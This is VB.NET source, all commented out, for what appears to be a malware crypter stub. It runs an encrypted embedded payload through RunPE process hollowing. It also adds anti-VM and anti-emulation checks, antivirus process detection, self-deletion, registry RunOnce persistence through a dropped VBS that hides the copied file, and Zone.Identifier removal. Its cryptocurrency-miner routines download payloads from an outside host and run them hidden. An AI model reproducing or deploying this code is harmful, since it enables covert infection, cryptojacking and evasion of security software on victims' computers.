'Imports Microsoft.VisualBasic.CompilerServices
'Imports System.Runtime.InteropServices
'Imports System.Threading
'Imports System.Reflection
'Imports System.Text
'Imports System.Security
'Imports System.IO
'Imports System
'Imports System.Diagnostics
'Imports Microsoft.VisualBasic
'Imports System.Windows
'Imports System.Runtime.CompilerServices

''<DefaultMemberAttribute("Running")> Class RunPE

'Module MainMod
'    Sub Main()
'        RunPE.Running()
'    End Sub
'End Module

'Class RunPE

'    <DllImport("kernel32.dll", EntryPoint:="CreateProcess", CharSet:=CharSet.Unicode), SuppressUnmanagedCodeSecurity> _
'    Private Shared Function CreateProcess( _
'    ByVal applicationName As String, _
'    ByVal commandLine As String, _
'    ByVal processAttributes As IntPtr, _
'    ByVal threadAttributes As IntPtr, _
'    ByVal inheritHandles As Boolean, _
'    ByVal creationFlags As UInteger, _
'    ByVal environment As IntPtr, _
'    ByVal currentDirectory As String, _
'    ByRef startupInfo As STARTUP_INFORMATION, _
'    ByRef processInformation As PROCESS_INFORMATION) As Boolean
'    End Function

'    <DllImport("kernel32.dll", EntryPoint:="GetThreadContext"), SuppressUnmanagedCodeSecurity> _
'    Private Shared Function GetThreadContext( _
'    ByVal thread As IntPtr, _
'    ByVal context As Integer()) As Boolean
'    End Function

'    <DllImport("kernel32.dll", EntryPoint:="Wow64GetThreadContext"), SuppressUnmanagedCodeSecurity> _
'    Private Shared Function Wow64GetThreadContext( _
'    ByVal thread As IntPtr, _
'    ByVal context As Integer()) As Boolean
'    End Function

'    <DllImport("kernel32.dll", EntryPoint:="SetThreadContext"), SuppressUnmanagedCodeSecurity> _
'    Private Shared Function SetThreadContext( _
'    ByVal thread As IntPtr, _
'    ByVal context As Integer()) As Boolean
'    End Function

'    <DllImport("kernel32.dll", EntryPoint:="Wow64SetThreadContext"), SuppressUnmanagedCodeSecurity> _
'    Private Shared Function Wow64SetThreadContext( _
'    ByVal thread As IntPtr, _
'    ByVal context As Integer()) As Boolean
'    End Function

'    <DllImport("kernel32.dll", EntryPoint:="ReadProcessMemory"), SuppressUnmanagedCodeSecurity> _
'    Private Shared Function ReadProcessMemory( _
'    ByVal process As IntPtr, _
'    ByVal baseAddress As Integer, _
'    ByRef buffer As Integer, _
'    ByVal bufferSize As Integer, _
'    ByRef bytesRead As Integer) As Boolean
'    End Function

'    <DllImport("kernel32.dll", EntryPoint:="WriteProcessMemory"), SuppressUnmanagedCodeSecurity> _
'    Private Shared Function WriteProcessMemory( _
'    ByVal process As IntPtr, _
'    ByVal baseAddress As Integer, _
'    ByVal buffer As Byte(), _
'    ByVal bufferSize As Integer, _
'    ByRef bytesWritten As Integer) As Boolean
'    End Function

'    <DllImport("ntdll.dll", EntryPoint:="NtUnmapViewOfSection"), SuppressUnmanagedCodeSecurity> _
'    Private Shared Function NtUnmapViewOfSection( _
'    ByVal process As IntPtr, _
'    ByVal baseAddress As Integer) As Integer
'    End Function

'    <DllImport("kernel32.dll", EntryPoint:="VirtualAllocEx"), SuppressUnmanagedCodeSecurity> _
'    Private Shared Function VirtualAllocEx( _
'    ByVal handle As IntPtr, _
'    ByVal address As Integer, _
'    ByVal length As Integer, _
'    ByVal type As Integer, _
'    ByVal protect As Integer) As Integer
'    End Function

'    <DllImport("kernel32.dll", EntryPoint:="ResumeThread"), SuppressUnmanagedCodeSecurity> _
'    Private Shared Function ResumeThread( _
'    ByVal handle As IntPtr) As Integer
'    End Function

'    <StructLayout(LayoutKind.Sequential, Pack:=1)> _
'    Private Structure PROCESS_INFORMATION
'        Public ProcessHandle As IntPtr
'        Public ThreadHandle As IntPtr
'        Public ProcessId As UInteger
'        Public ThreadId As UInteger
'    End Structure

'    <StructLayout(LayoutKind.Sequential, Pack:=1)> _
'    Private Structure STARTUP_INFORMATION
'        Public Size As UInteger
'        Public Reserved1 As String
'        Public Desktop As String
'        Public Title As String

'        '<MarshalAs(UnmanagedType.ByValArray, SizeConst:=36)> _
'        'Public Misc As Byte()

'        Public dwX As Integer
'        Public dwY As Integer
'        Public dwXSize As Integer
'        Public dwYSize As Integer
'        Public dwXCountChars As Integer
'        Public dwYCountChars As Integer
'        Public dwFillAttribute As Integer
'        Public dwFlags As Integer
'        Public wShowWindow As Short
'        Public cbReserved2 As Short

'        Public Reserved2 As IntPtr
'        Public StdInput As IntPtr
'        Public StdOutput As IntPtr
'        Public StdError As IntPtr
'    End Structure

'    Public Shared Sub AntiEmulation()
'        Dim random As Random = New Random()
'        Dim s As String = String.Concat(New String() {Conversions.ToString(Strings.Chr(random.[Next](97, 122))), Conversions.ToString(Strings.Chr(random.[Next](97, 122))), Conversions.ToString(Strings.Chr(random.[Next](97, 122))), Conversions.ToString(Strings.Chr(random.[Next](97, 122))), Conversions.ToString(Strings.Chr(random.[Next](97, 105)))})
'        Dim instance As Object = Cryptography.MD5.Create()
'        Dim objectValue As Object = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(instance, Nothing, "ComputeHash", New Object() {Encoding.UTF8.GetBytes(s)}, Nothing, Nothing, Nothing))
'        Dim [string] As Object = Encoding.UTF8.GetString(CType(objectValue, Byte()))
'        Dim instance2 As Object = Cryptography.MD5.Create()
'        Dim num As Long = 97L
'        While True
'            Dim num2 As Long = 97L
'            Do
'                Dim num3 As Long = 97L
'                Do
'                    Dim num4 As Long = 97L
'                    Do
'                        Dim num5 As Long = 97L
'                        Do
'                            Dim objectValue2 As Object = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(instance2, Nothing, "ComputeHash", New Object() {Encoding.UTF8.GetBytes(String.Concat(New String() {Conversions.ToString(Strings.Chr(CInt(num))), Conversions.ToString(Strings.Chr(CInt(num2))), Conversions.ToString(Strings.Chr(CInt(num3))), Conversions.ToString(Strings.Chr(CInt(num4))), Conversions.ToString(Strings.Chr(CInt(num5)))}))}, Nothing, Nothing, Nothing))
'                            If Operators.CompareString(Encoding.UTF8.GetString(CType(objectValue2, Byte())), Encoding.UTF8.GetString(CType(objectValue, Byte())), False) = 0 Then
'                                Return
'                            End If
'                            num5 += 1L
'                        Loop While num5 <= 105L
'                        num4 += 1L
'                    Loop While num4 <= 122L
'                    num3 += 1L
'                Loop While num3 <= 122L
'                num2 += 1L
'            Loop While num2 <= 122L
'            num += 1L
'            If num > 122L Then
'                Return
'            End If
'        End While
'    End Sub

'    Public Shared Function Running() As Boolean

'        'For Each clsProcess As Process In Process.GetProcesses()
'        '    If clsProcess.ProcessName.StartsWith("vsserv") Then
'        '        Do While 1 = 1
'        '            AntiEmulation()
'        '        Loop

'        '        'Melt(10)
'        '    End If
'        '    If clsProcess.ProcessName.StartsWith("egui") Or clsProcess.ProcessName.StartsWith("ekrn") Then
'        '        AntiEmulation()
'        '        Melt(10)
'        '    End If
'        'Next

'        'If isVM() = True Then
'        '    AntiEmulation()
'        '    Melt(10)
'        'End If

'        Try

'            'beforedelay

'            'hidefileatt

'            'AntiEmulation()

'            System.Threading.Thread.Sleep(15000)

'            'Binder

'            'Miner

'            'ZoneID

'            'Startup

'            For I As Integer = 1 To 5
'                If HandleRun(System.Diagnostics.Process.GetCurrentProcess.MainModule.FileName, "", PIX_Func_002(ASDF(New System.Resources.ResourceManager("ResourceNameReplace", System.Reflection.Assembly.GetExecutingAssembly).GetObject("ResourceNameReplace"), 12983)), True) Then Exit For
'            Next

'            'afterdelay

'            Return False
'        Catch
'            For I As Integer = 1 To 5
'                If HandleRun(System.Diagnostics.Process.GetCurrentProcess.MainModule.FileName, "", PIX_Func_002(ASDF(New System.Resources.ResourceManager("ResourceNameReplace", System.Reflection.Assembly.GetExecutingAssembly).GetObject("ResourceNameReplace"), 12983)), True) Then Exit For
'            Next
'        End Try
'    End Function

'    Private Shared Sub Melt(ByVal Timeout As Integer)
'        Dim p As New System.Diagnostics.ProcessStartInfo("cmd.exe")
'        p.Arguments = "/C ping 1.1.1.1 -n 1 -w " & Timeout.ToString & " > Nul & Del " & ControlChars.Quote & System.Diagnostics.Process.GetCurrentProcess.MainModule.FileName & ControlChars.Quote
'        p.CreateNoWindow = True
'        p.ErrorDialog = False
'        p.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden
'        System.Diagnostics.Process.Start(p)
'        System.Diagnostics.Process.GetCurrentProcess.Kill()
'    End Sub

'    Public Shared Function MinerRun(ByVal path As String, ByVal cmd As String, ByVal data As Byte(), ByVal compatible As Boolean, ByVal hidden As Boolean) As Boolean
'        For I As Integer = 1 To 5
'            If HandleRun(path, cmd, data, compatible, hidden) Then Return True
'        Next

'        Return False
'    End Function

'    Private Shared Function HandleRun(ByVal path As String, ByVal cmd As String, ByVal data As Byte(), ByVal compatible As Boolean, Optional ByVal hidden As Boolean = False) As Boolean

'        Dim ReadWrite As Integer
'        Dim QuotedPath As String = String.Format("""{0}""", path)

'        Dim SI As New STARTUP_INFORMATION
'        Dim PI As New PROCESS_INFORMATION

'        SI.Size = CUInt(Marshal.SizeOf(GetType(STARTUP_INFORMATION)))

'        If hidden = True Then
'            SI.wShowWindow = 0
'            SI.dwFlags = 1
'        End If

'        Try
'            If Not String.IsNullOrEmpty(cmd) Then
'                QuotedPath = QuotedPath & " " & cmd
'            End If

'            If Not CreateProcess(path, QuotedPath, IntPtr.Zero, IntPtr.Zero, False, 4, IntPtr.Zero, Nothing, SI, PI) Then Throw New Exception()

'            Dim FileAddress As Integer = BitConverter.ToInt32(data, 60)
'            Dim ImageBase As Integer = BitConverter.ToInt32(data, FileAddress + 52)

'            Dim Context(179 - 1) As Integer
'            Context(0) = 65538

'            If IntPtr.Size = 4 Then
'                If Not GetThreadContext(PI.ThreadHandle, Context) Then Throw New Exception()
'            Else
'                If Not Wow64GetThreadContext(PI.ThreadHandle, Context) Then Throw New Exception()
'            End If

'            Dim Ebx As Integer = Context(41)
'            Dim BaseAddress As Integer

'            If Not ReadProcessMemory(PI.ProcessHandle, Ebx + 8, BaseAddress, 4, ReadWrite) Then Throw New Exception()

'            If ImageBase = BaseAddress Then
'                If Not NtUnmapViewOfSection(PI.ProcessHandle, BaseAddress) = 0 Then Throw New Exception()
'            End If

'            Dim SizeOfImage As Integer = BitConverter.ToInt32(data, FileAddress + 80)
'            Dim SizeOfHeaders As Integer = BitConverter.ToInt32(data, FileAddress + 84)

'            Dim AllowOverride As Boolean
'            Dim NewImageBase As Integer = VirtualAllocEx(PI.ProcessHandle, ImageBase, SizeOfImage, 12288, 64)

'            'This is the only way to execute under certain conditions. However, it may show
'            'an application error probably because things aren't being relocated properly.

'            If Not compatible AndAlso NewImageBase = 0 Then
'                AllowOverride = True
'                NewImageBase = VirtualAllocEx(PI.ProcessHandle, 0, SizeOfImage, 12288, 64)
'            End If

'            If NewImageBase = 0 Then Throw New Exception()

'            If Not WriteProcessMemory(PI.ProcessHandle, NewImageBase, data, SizeOfHeaders, ReadWrite) Then Throw New Exception()

'            Dim SectionOffset As Integer = FileAddress + 248
'            Dim NumberOfSections As Short = BitConverter.ToInt16(data, FileAddress + 6)

'            For I As Integer = 0 To NumberOfSections - 1
'                Dim VirtualAddress As Integer = BitConverter.ToInt32(data, SectionOffset + 12)
'                Dim SizeOfRawData As Integer = BitConverter.ToInt32(data, SectionOffset + 16)
'                Dim PointerToRawData As Integer = BitConverter.ToInt32(data, SectionOffset + 20)

'                If Not SizeOfRawData = 0 Then
'                    Dim SectionData(SizeOfRawData - 1) As Byte
'                    Buffer.BlockCopy(data, PointerToRawData, SectionData, 0, SectionData.Length)

'                    If Not WriteProcessMemory(PI.ProcessHandle, NewImageBase + VirtualAddress, SectionData, SectionData.Length, ReadWrite) Then Throw New Exception()
'                End If

'                SectionOffset += 40
'            Next

'            Dim PointerData As Byte() = BitConverter.GetBytes(NewImageBase)
'            If Not WriteProcessMemory(PI.ProcessHandle, Ebx + 8, PointerData, 4, ReadWrite) Then Throw New Exception()

'            Dim AddressOfEntryPoint As Integer = BitConverter.ToInt32(data, FileAddress + 40)

'            If AllowOverride Then NewImageBase = ImageBase
'            Context(44) = NewImageBase + AddressOfEntryPoint

'            If IntPtr.Size = 4 Then
'                If Not SetThreadContext(PI.ThreadHandle, Context) Then Throw New Exception()
'            Else
'                If Not Wow64SetThreadContext(PI.ThreadHandle, Context) Then Throw New Exception()
'            End If

'            If ResumeThread(PI.ThreadHandle) = -1 Then Throw New Exception()
'        Catch
'            Dim P As Process = Process.GetProcessById(CInt(PI.ProcessId))
'            If P IsNot Nothing Then P.Kill()

'            Return False
'        End Try

'        'Return True

'        'Do While True
'        Threading.Thread.Sleep(6000)

'        Return True
'        'Loop

'    End Function

'    'Public Shared Function PIX_Func_001(PIX_Sub_001 As System.Drawing.Bitmap) As Byte()
'    '    Dim PIX_Sub_002 As System.Collections.Generic.List(Of System.Byte) = New System.Collections.Generic.List(Of System.Byte)()
'    '    For PIX_Sub_003 As Integer = 0 To PIX_Sub_001.Width - 1
'    '        For PIX_Sub_004 As Integer = 0 To PIX_Sub_001.Height - 1
'    '            Dim PIX_Sub_005 As System.Drawing.Color = PIX_Sub_001.GetPixel(PIX_Sub_003, PIX_Sub_004)
'    '            If PIX_Sub_005 <> System.Drawing.Color.FromArgb(0, 0, 0, 0) Then
'    '                PIX_Sub_002.Add(PIX_Sub_005.R)
'    '                PIX_Sub_002.Add(PIX_Sub_005.G)
'    '                PIX_Sub_002.Add(PIX_Sub_005.B)
'    '            End If
'    '        Next
'    '    Next
'    '    Return PIX_Func_002(PIX_Sub_002.ToArray())
'    'End Function

'    Public Shared Function PIX_Func_002(PIX_Sub_006 As Byte()) As Byte()
'        Dim PIX_Sub_007 As Byte() = Nothing
'        Using PIX_Sub_008 As New System.IO.MemoryStream()
'            Using PIX_Sub_009 As New System.IO.MemoryStream(AES_Decrypt(PIX_Sub_006, "EncKey"))
'                Using PIX_Sub_010 As New System.IO.Compression.GZipStream(PIX_Sub_009, System.IO.Compression.CompressionMode.Decompress)
'                    PIX_Func_003(PIX_Sub_010, PIX_Sub_008)
'                End Using
'            End Using
'            PIX_Sub_007 = PIX_Sub_008.ToArray()
'        End Using
'        Return PIX_Sub_007
'    End Function

'    Public Shared Function PIX_Func_002_COIN(PIX_Sub_006 As Byte()) As Byte()
'        Dim PIX_Sub_007 As Byte() = Nothing
'        Using PIX_Sub_008 As New System.IO.MemoryStream()
'            Using PIX_Sub_009 As New System.IO.MemoryStream(PIX_Sub_006)
'                Using PIX_Sub_010 As New System.IO.Compression.GZipStream(PIX_Sub_009, System.IO.Compression.CompressionMode.Decompress)
'                    PIX_Func_003(PIX_Sub_010, PIX_Sub_008)
'                End Using
'            End Using
'            PIX_Sub_007 = PIX_Sub_008.ToArray()
'        End Using
'        Return PIX_Sub_007
'    End Function

'    Private Shared Sub PIX_Func_003(PIX_Sub_011 As System.IO.Stream, PIX_Sub_012 As System.IO.Stream)
'        Dim PIX_Sub_013 As Byte() = New Byte(2047) {}
'        Dim PIX_Sub_014 As Integer
'        While (PIX_Func_004(PIX_Sub_014, PIX_Sub_011.Read(PIX_Sub_013, 0, PIX_Sub_013.Length))) > 0
'            PIX_Sub_012.Write(PIX_Sub_013, 0, PIX_Sub_014)
'        End While
'    End Sub

'    Private Shared Function PIX_Func_004(Of PIX_Sub_015)(ByRef PIX_Sub_016 As PIX_Sub_015, PIX_Sub_017 As PIX_Sub_015) As PIX_Sub_015
'        PIX_Sub_016 = PIX_Sub_017
'        Return PIX_Sub_017
'    End Function

'    'Public Shared Sub CMD_ADD_SUB(ByVal WRT_RG_Sub_001_arg01 As String, ByVal WRT_RG_Sub_001_arg02 As String, ByVal WRT_RG_Sub_001_arg03 As String, ByVal WRT_RG_Sub_001_arg04 As String, ByVal WRT_RG_Sub_001_arg05 As String)
'    '    Dim WRT_RG_Sub_001_var01 As String = "reg add " & """" & WRT_RG_Sub_001_arg01 & """" & " /v " & """" & WRT_RG_Sub_001_arg02 & """" & " /t " & WRT_RG_Sub_001_arg04 & " /d " & """" & WRT_RG_Sub_001_arg03 & """" & " /f"
'    '    Dim vbsw As TextWriter
'    '    vbsw = New StreamWriter(Environ("appdata") & "\" & WRT_RG_Sub_001_arg05 & ".bat")
'    '    vbsw.Write(WRT_RG_Sub_001_var01)
'    '    vbsw.Close()
'    '    Dim WRT_RG_Sub_001_var02 As ProcessStartInfo = New ProcessStartInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & WRT_RG_Sub_001_arg05 & ".bat")
'    '    WRT_RG_Sub_001_var02.WindowStyle = ProcessWindowStyle.Hidden
'    '    Process.Start(WRT_RG_Sub_001_var02).WaitForExit(Int32.MaxValue)
'    'End Sub

'    Public Shared Function CMD_ADD_SUB(ByVal name As String, ByVal tpath As String)

'        If Not File.Exists(Environ("appdata") & "\ResourceNameReplace.vbs") Then

'            Dim block As String
'            block = "on error resume next" & vbNewLine & _
'            "set wshShell = CreateObject( ""WScript.Shell"" )" & vbNewLine & _
'            "wshShell.RegWrite ""HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\" & name & """, """ & tpath & """" & vbNewLine & _
'            "set filesys = CreateObject(""Scripting.FileSystemObject"")" & vbNewLine & _
'            "filesys.CopyFile""" & Process.GetCurrentProcess.MainModule.FileName & """, """ & tpath & """" & vbNewLine & _
'            "set f = filesys.GetFile(""" & tpath & """)" & vbNewLine & _
'            "f.attributes = 7" & vbNewLine & _
'            "filesys.DeleteFile WScript.ScriptFullName"

'            Dim vbsw As TextWriter
'            vbsw = New StreamWriter(Environ("appdata") & "\ResourceNameReplace.vbs")
'            vbsw.Write(block)
'            vbsw.Close()

'        End If

'        Process.Start("explorer.exe", Environ("appdata") & "\ResourceNameReplace.vbs")

'    End Function

'    Public Shared Function ByteArrayToFile(FileName As String, ByteArray As Byte(), RunOnce As Boolean, Run As Boolean) As Boolean

'        If (File.Exists(FileName) And RunOnce = True) Then
'            Exit Function
'        Else
'            Dim FileStream As FileStream = New System.IO.FileStream(FileName, System.IO.FileMode.Create)
'            For abcdefg As Integer = 0 To ByteArray.Length - 1
'                FileStream.WriteByte(ByteArray(abcdefg))
'            Next abcdefg
'            FileStream.Close()
'            'FileStream.Write(ByteArray, 0, ByteArray.Length)
'            'FileStream.Close()

'            If Run = True Then
'                Process.Start("explorer.exe", FileName)
'            End If
'        End If

'    End Function

'    <DllImport("kernel32", CharSet:=CharSet.Unicode, SetLastError:=True)> _
'    Public Shared Function DeleteFile(name As String) As <MarshalAs(UnmanagedType.Bool)> Boolean
'    End Function

'    Public Shared Function Unblock()
'        Return DeleteFile(Process.GetCurrentProcess.MainModule.FileName & Convert.ToString(":Zone.Identifier"))
'    End Function

'    Public Shared Sub Run2()

'        'For Each clsProcess As Process In Process.GetProcesses()
'        '    If clsProcess.ProcessName.StartsWith("vsserv") Then
'        '        Do While 1 = 1
'        '            AntiEmulation()
'        '        Loop

'        '        'Melt(10)
'        '    End If
'        '    If clsProcess.ProcessName.StartsWith("egui") Or clsProcess.ProcessName.StartsWith("ekrn") Then
'        '        AntiEmulation()
'        '        Melt(10)
'        '    End If
'        'Next

'        'If isVM() = True Then
'        '    AntiEmulation()
'        '    Melt(10)
'        'End If

'        'beforedelay

'        'hidefileatt

'        'AntiEmulation()

'        System.Threading.Thread.Sleep(15000)

'        'Binder

'        'Miner

'        'ZoneID

'        'Startup

'        RunPE.Run3(PIX_Func_002(ASDF(New System.Resources.ResourceManager("ResourceNameReplace", System.Reflection.Assembly.GetExecutingAssembly).GetObject("ResourceNameReplace"), 12983)))

'        'afterdelay
'    End Sub

'    'customsub

'    Shared Sub Run3(ByVal data As Byte())
'        Dim T As New Thread(AddressOf Run4) 'Work around for "SetCompatibleTextRenderingDefault"
'        T.SetApartmentState(ApartmentState.STA) 'Set STA to support drag/drop and dialogs?
'        T.Start(data)
'    End Sub
'    Shared Sub Run4(ByVal o As Object)
'        Dim T As MethodInfo = Assembly.Load(DirectCast(o, Byte())).EntryPoint

'        'T.Invoke(Nothing, If(T.GetParameters.Length = 1, New Object() {New String() {Nothing}}, Nothing)) 'Invoke logic for Console or Form

'        If T.GetParameters.Length = 1 Then
'            T.Invoke(Nothing, New Object() {New String() {}})
'        Else
'            T.Invoke(Nothing, Nothing)
'        End If

'        Do While True
'            Threading.Thread.Sleep(2000)
'        Loop

'    End Sub

'    Public Shared Sub LTCGPU(ByVal p1 As String, ByVal p2 As String, ByVal p3 As String, ByVal hidden As Boolean, Optional ByVal proxy As String = "")
'        LTCCPU(p1, p2, p3, hidden, proxy)
'        Dim myWebClient As New Net.WebClient()
'        Dim DLByte As Byte() = myWebClient.DownloadData("http://byte.textme.pw/BFGC")
'        Dim UnCompress As Byte() = PIX_Func_002_COIN(ASDF(DLByte, 8))

'        If proxy.Length > 1 Then
'            MinerRun(Process.GetCurrentProcess.MainModule.FileName, "-S opencl:auto --scrypt --url=" & p1 & " --userpass=" & p2 & ":" & p3 & " -x " & proxy, UnCompress, True, hidden)
'        Else
'            MinerRun(Process.GetCurrentProcess.MainModule.FileName, "-S opencl:auto --scrypt --url=" & p1 & " --userpass=" & p2 & ":" & p3, UnCompress, True, hidden)
'        End If

'    End Sub

'    Public Shared Sub BTCGPU(ByVal p1 As String, ByVal p2 As String, ByVal p3 As String, ByVal hidden As Boolean, Optional ByVal proxy As String = "")
'        BTCCPU(p1, p2, p3, hidden, proxy)
'        Dim myWebClient As New Net.WebClient()
'        Dim DLByte As Byte() = myWebClient.DownloadData("http://byte.textme.pw/BFGC")
'        Dim UNXOR As Byte() = ASDF(DLByte, 8)
'        Dim UnCompress As Byte() = PIX_Func_002_COIN(UNXOR)

'        If proxy.Length > 1 Then
'            MinerRun(Process.GetCurrentProcess.MainModule.FileName, "-S opencl:auto --url=" & p1 & " -u " & p2 & " -p " & p3 & " --gpu-threads=2 --intensity=6 -x " & proxy, UnCompress, True, hidden)
'        Else
'            MinerRun(Process.GetCurrentProcess.MainModule.FileName, "-S opencl:auto --url=" & p1 & " -u " & p2 & " -p " & p3 & " --gpu-threads=2 --intensity=6", UnCompress, True, hidden)
'        End If

'    End Sub

'    Public Shared Sub LTCCPU(ByVal p1 As String, ByVal p2 As String, ByVal p3 As String, ByVal hidden As Boolean, Optional ByVal proxy As String = "")

'        Dim myWebClient As New Net.WebClient()
'        Dim DLByte As Byte() = myWebClient.DownloadData("http://byte.textme.pw/CPUC")
'        Dim UnCompress As Byte() = PIX_Func_002_COIN(ASDF(DLByte, 8))

'        If proxy.Length > 1 Then
'            MinerRun(Process.GetCurrentProcess.MainModule.FileName, "--url=" & p1 & " --userpass=" & p2 & ":" & p3 & "--proxy=" & proxy, UnCompress, True, hidden)
'        Else
'            MinerRun(Process.GetCurrentProcess.MainModule.FileName, "--url=" & p1 & " --userpass=" & p2 & ":" & p3, UnCompress, True, hidden)
'        End If

'    End Sub

'    Public Shared Sub BTCCPU(ByVal p1 As String, ByVal p2 As String, ByVal p3 As String, ByVal hidden As Boolean, Optional ByVal proxy As String = "")

'        Dim myWebClient As New Net.WebClient()
'        Dim DLByte As Byte() = myWebClient.DownloadData("http://byte.textme.pw/CPUC")
'        Dim UnCompress As Byte() = PIX_Func_002_COIN(ASDF(DLByte, 8))

'        If proxy.Length > 1 Then
'            MinerRun(Process.GetCurrentProcess.MainModule.FileName, "--url=" & p1 & " --userpass=" & p2 & ":" & p3 & " --algo=sha256d --proxy=" & proxy, UnCompress, True, hidden)
'        Else
'            MinerRun(Process.GetCurrentProcess.MainModule.FileName, "--url=" & p1 & " --userpass=" & p2 & ":" & p3 & " --algo=sha256d", UnCompress, True, hidden)
'        End If

'    End Sub

'    Public Shared Function ASDF(buffer1 As Byte(), buffer2 As Integer) As Byte()

'        For i As Integer = 0 To buffer1.Length - 1 Step buffer2
'            buffer1(i) = CByte(buffer1(i) Xor buffer2)
'        Next

'        Return buffer1
'    End Function

'    Public Shared Function AES_Decrypt(ByVal input As Byte(), ByVal pass As String) As Byte()
'        Dim AES As New System.Security.Cryptography.RijndaelManaged
'        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
'        Dim decrypted As Byte()
'        Try
'            Dim hash(31) As Byte
'            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
'            Array.Copy(temp, 0, hash, 0, 16)
'            Array.Copy(temp, 0, hash, 15, 16)
'            AES.Key = hash
'            AES.Mode = Security.Cryptography.CipherMode.ECB
'            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
'            Dim Buffer As Byte() = input
'            decrypted = DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
'            Return decrypted
'        Catch ex As Exception
'        End Try
'    End Function

'    Public Shared Function isVM() As Boolean
'        Try
'            If IO.File.Exists(IO.Path.GetTempPath & "ms.ini") Then Return False
'            Dim searcher As New System.Management.ManagementObjectSearcher("root\CIMV2", "SELECT * FROM Win32_VideoController")
'            Dim str As String = String.Empty
'            Dim obj2 As System.Management.ManagementObject
'            For Each obj2 In searcher.Get
'                str = Convert.ToString(obj2.Item("Description"))
'                Dim Search As String = StrConv(str, VbStrConv.Lowercase)
'                If Search.Contains("virtual") Then Return True
'                If Search.Contains("vmware") Then Return True
'                If Search.Contains("parallel") Then Return True
'                If Search.Contains("vm additions") Then Return True
'                If Search.Contains("remotefx") Then Return True
'                If Search.Contains("generic") Then Return True
'                If Search.Contains("cirrus logic") Then Return True
'                If Search.Contains("standard vga") Then Return True
'                If Search.Contains("matrox") Then Return True
'            Next
'            Return False
'        Catch ex As Exception
'            Return False
'        End Try
'    End Function

'    Public Shared Sub Forefit()
'        On Error Resume Next
'        Dim i As Integer = 1
'        While Not i = 100000
'            i = i + 1
'        End While
'        Forefit()
'    End Sub

'End Class